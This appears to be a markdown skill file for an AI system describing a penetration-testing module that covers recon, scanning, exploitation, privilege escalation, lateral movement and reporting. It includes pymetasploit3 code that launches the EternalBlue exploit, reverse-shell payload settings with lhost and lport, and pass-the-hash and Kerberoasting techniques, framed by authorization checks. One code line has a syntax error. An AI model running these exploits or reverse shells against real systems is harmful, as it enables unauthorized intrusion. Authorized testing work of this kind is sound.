---
name: "penetration-testing"
category: "cybersecurity"
version: "2.0.0"
tags: ["cybersecurity", "pentesting", "red-team", "exploitation", "vulnerability"]
---

# Penetration Testing

## Overview

The Penetration Testing module provides structured methodologies and tools for authorized security testing of systems, networks, and applications. It covers reconnaissance, vulnerability scanning, exploitation, privilege escalation, lateral movement, and reporting following industry-standard frameworks (OWASP, PTES, NIST).

This skill is essential for penetration testers, red team operators, and security consultants conducting authorized security assessments.

## Core Capabilities

- **Reconnaissance**: Passive and active information gathering, OSINT, and attack surface mapping
- **Scanning**: Port scanning, service enumeration, vulnerability scanning, and technology fingerprinting
- **Exploitation**: Vulnerability exploitation, proof-of-concept development, and exploit chaining
- **Privilege Escalation**: Linux/Windows privilege escalation techniques and misconfigurations
- **Lateral Movement**: Network pivoting, credential reuse, and active directory attacks
- **Post-Exploitation**: Data exfiltration, persistence mechanisms, and evidence collection
- **Web Application Testing**: OWASP Top 10 testing, API security, and authentication bypass
- **Reporting**: Finding documentation, risk ratings, and remediation recommendations

## Usage Examples

```python
from penetration_testing import (
    ReconEngine,
    VulnScanner,
    ExploitFramework,
    PrivEscDetector,
    ReportGenerator,
)

# --- Reconnaissance ---
recon = ReconEngine()
results = recon.passive_recon(target="example.com")
print(f"Subdomains found: {len(results.subdomains)}")
print(f"IP addresses: {results.ip_addresses}")
print(f"Email addresses: {len(results.emails)}")

# --- Scanning ---
scanner = VulnScanner()
scan_results = scanner.scan(
    target="192.168.1.0/24",
    scan_type="service",
    ports="1-65535",
)
print(f"Hosts up: {scan_results.hosts_up}")
print(f"Open ports: {len(scan_results.open_ports)}")
print(f"Vulnerabilities: {len(scan_results.vulnerabilities)}")

# --- Exploitation ---
exploit = ExploitFramework()
result = exploit.run_exploit(
    target="192.168.1.10",
    exploit="ms17_010",
    payload="reverse_shell",
    lhost="192.168.1.5",
    lport=4444,
)
print(f"Exploit success: {result.success}")
print(f"Shell obtained: {result.shell_type}")

# --- Privilege Escalation ---
privesc = PrivEscDetector()
vulns = privesc.check_linux(
    os_info="Ubuntu 20.04",
    kernel_version="5.4.0-42",
    suid_binaries=["/usr/bin/find", "/usr/bin/vim"],
    sudo_permissions="ALL",
)
for v in vulns:
    print(f"  [{v.severity}] {v.technique}")

# --- Report ---
reporter = ReportGenerator()
report = reporter.generate(
    findings=vulns,
    scope="192.168.1.0/24",
    methodology="OWASP Testing Guide",
    executive_summary="Critical vulnerabilities found in web application",
)
print(f"Report: {report.title}")
print(f"Findings: {report.total_findings}")
```

## Best Practices

- Always obtain written authorization before testing — never test without permission
- Define clear scope boundaries and rules of engagement before starting
- Document everything — evidence collection is critical for report credibility
- Use non-destructive techniques first — escalate carefully with client approval
- Test in production-like environments when possible for realistic results
- Validate all findings manually before reporting — false positives waste client time
- Provide actionable remediation steps, not just vulnerability descriptions
- Follow responsible disclosure timelines for any discovered vulnerabilities
- Use isolated test environments for exploit development and validation
- Maintain chain of custody for all evidence collected during testing

## Related Modules

- **security-audit**: Systematic security auditing methodology
- **threat-intelligence**: Threat data for targeted testing
- **incident-response**: Post-compromise investigation techniques
- **digital-forensics**: Evidence analysis after exploitation

---

## Advanced Configuration

### Scoping Configuration

Define testing scope and rules of engagement.

```python
scope_config = ScopeConfig(
    in_scope=["*.target.com", "192.168.0.0/16"],
    out_of_scope=["admin.target.com", "10.0.0.0/8"],
    testing_hours="Mon-Fri 9:00-17:00",
    emergency_contact="+1-555-0123",
    max_exploitation_level="medium",
    data_handling="no_pii_collection",
)
```

### Tool Configuration

Configure penetration testing tools.

```python
tool_config = PentestToolConfig(
    nmap={
        "scan_type": "service",
        "timing": "T4",
        "scripts": ["default", "vuln"],
    },
    burp={
        "proxy_port": 8080,
        "scope_regex": r".*\.target\.com",
        "active_scan": True,
    },
    metasploit={
        "workspace": "engagement_001",
        "lhost": "10.10.10.1",
        "lport": 4444,
    },
)
```

### Evidence Collection Configuration

Configure evidence collection and handling.

```python
evidence_config = EvidenceConfig(
    storage_path="/secure/evidence",
    encryption="AES-256",
    chain_of_custody=True,
    retention_days=90,
    screenshot_quality="high",
    video_recording=False,
)
```

---

## Architecture Patterns

### PTES Methodology Pattern

```python
class PTESFramework:
    phases = [
        "pre_engagement",
        "intelligence_gathering",
        "threat_modeling",
        "vulnerability_analysis",
        "exploitation",
        "post_exploitation",
        "reporting",
    ]

    def execute_phase(self, phase, context):
        handler = self.get_phase_handler(phase)
        return handler.execute(context)
```

### Exploit Chain Pattern

```python
class ExploitChain:
    def __init__(self):
        self.steps = []

    def add_step(self, exploit, prerequisites=None):
        self.steps.append(ExploitStep(exploit, prerequisites))

    def execute(self, target):
        context = {}
        for step in self.steps:
            if step prerequisites_met(context):
                result = step.exploit.execute(target, context)
                context.update(result.context)
        return context
```

### Lateral Movement Pattern

```python
class LateralMovement:
    def __init__(self):
        self.techniques = [
            PsExec(),
            WMI(),
            WinRM(),
            PassTheHash(),
            Kerberoasting(),
        ]

    def move(self, current_host, target_host, credentials):
        for technique in self.techniques:
            if technique.is_applicable(current_host, target_host):
                return technique.execute(current_host, target_host, credentials)
```

---

## Integration Guide

### Nmap Integration

```python
import nmap

nm = nmap.PortScanner()
nm.scan("192.168.1.0/24", arguments="-sV -sC -O")

for host in nm.all_hosts():
    print(f"Host: {host}")
    for proto in nm[host].all_protocols():
        ports = nm[host][proto].keys()
        for port in ports:
            print(f"  Port: {port}, State: {nm[host][proto][port]['state']}")
```

### Burp Suite Integration

```python
# Using Burp Suite REST API
burp = BurpSuiteAPI(
    host="http://localhost:1337",
    api_key="..."
)

# Add target to scope
burp.scope.add_to_scope("https://target.com")

# Start active scan
scan = burp.scanner.scan("https://target.com")

# Get findings
findings = burp.scan_results.get_findings(scan.id)
```

### Metasploit Integration

```python
from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient("password", server="127.0.0.1", port=55553)

# Use an exploit
exploit = client.modules.use("exploit", "windows/smb/ms17_010_eternalblue")
exploit["RHOSTS"] = "192.168.1.100"
exploit["LHOST"] = "192.168.1.5"
result = exploit.execute()
```

---

## Performance Optimization

### Parallel Scanning

```python
from concurrent.futures import ThreadPoolExecutor

def parallel_scan(targets, scan_type):
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(scan, t, scan_type) for t in targets]
        return [f.result() for f in futures]
```

### Result Caching

```python
# Cache scan results to avoid re-scanning
scan_cache = ScanCache(
    backend="sqlite",
    ttl_hours=24,
    max_entries=1000,
)
```

---

## Security Considerations

### Authorization Verification

```python
class AuthorizationVerifier:
    def verify_authorization(self, target, authorization_doc):
        if not self.is_in_scope(target, authorization_doc.scope):
            raise OutOfScopeError(f"{target} not in authorized scope")
        if not self.is_within_time(authorization_doc.testing_hours):
            raise OutsideTestingHoursError()
```

### Safe Exploitation

```python
class SafeExploitation:
    def __init__(self):
        self.risk_level = "medium"
        self.backup_required = True

    def execute(self, exploit, target):
        if exploit.risk_level > self.risk_level:
            raise ExploitTooRisky(f"Risk level {exploit.risk_level} > {self.risk_level}")
        if self.backup_required:
            self.create_backup(target)
        return exploit.execute(target)
```

---

## Troubleshooting Guide

### Common Issues

| Symptom | Cause | Solution |
|---------|-------|----------|
| Scan blocked | Firewall/WAF | Adjust scan timing |
| Exploit failed | Patched vulnerability | Try alternative exploit |
| No results | Wrong scope | Verify target in scope |
| False positives | Aggressive scanning | Manual verification |

---

## API Reference

### ReconEngine

```python
class ReconEngine:
    def passive_recon(target) -> ReconResults
    def active_recon(target) -> ReconResults
    def osint_recon(target) -> OSINTResults
```

### VulnScanner

```python
class VulnScanner:
    def scan(target, scan_type, ports) -> ScanResults
    def web_scan(url, options) -> WebScanResults
    def credential_scan(hosts, credentials) -> CredentialResults
```

### ExploitFramework

```python
class ExploitFramework:
    def run_exploit(target, exploit, payload, lhost, lport) -> ExploitResult
    def search_exploits(service, version) -> List[Exploit]
    def generate_payload(type, options) -> Payload
```

---

## Data Models

### ReconResults

```python
@dataclass
class ReconResults:
    target: str
    subdomains: List[str]
    ip_addresses: List[str]
    open_ports: List[dict]
    services: List[dict]
    technologies: List[str]
    emails: List[str]
```

### ExploitResult

```python
@dataclass
class ExploitResult:
    success: bool
    exploit_name: str
    target: str
    shell_type: Optional[str]
    output: str
    evidence: List[Evidence]
```

---

## Deployment Guide

### Pentest Lab Setup

```yaml
# Docker setup for pentest lab
services:
  kali:
    image: kalilinux/kali-rolling
    command: sleep infinity
    volumes:
      - ./tools:/tools
      - ./evidence:/evidence
    network_mode: host
```

---

## Monitoring & Observability

### Key Metrics

| Metric | Description | Alert Threshold |
|--------|-------------|-----------------|
| `pentest.scans.completed` | Scans completed | Track |
| `pentest.vulns.found` | Vulnerabilities found | Track |
| `pentest.exploits.successful` | Successful exploits | Track |

---

## Testing Strategy

### Exploit Validation

```python
def test_exploit():
    framework = ExploitFramework()
    result = framework.run_exploit(
        target="test-target",
        exploit="test_vuln",
        payload="reverse_shell",
        lhost="10.10.10.1",
        lport=4444,
    )
    assert result.success
```

---

## Versioning & Migration

### Tool Versioning

Track tool versions for reproducibility.

---

## Glossary

| Term | Definition |
|------|-----------|
| **Reconnaissance** | Information gathering phase |
| **Exploitation** | Leveraging vulnerabilities for access |
| **Privilege Escalation** | Gaining higher-level permissions |
| **Lateral Movement** | Moving between systems in network |
| **Post-Exploitation** | Actions after gaining access |

---

## Changelog

### v2.0.0
- Added automated exploit chains
- Lateral movement techniques
- Evidence collection system

### v1.0.0
- Initial release with basic scanning

---

## Contributing Guidelines

- Always obtain written authorization
- Document all actions
- Handle evidence properly

---

## License

MIT License

Copyright (c) 2024 Awesome Grok Skills
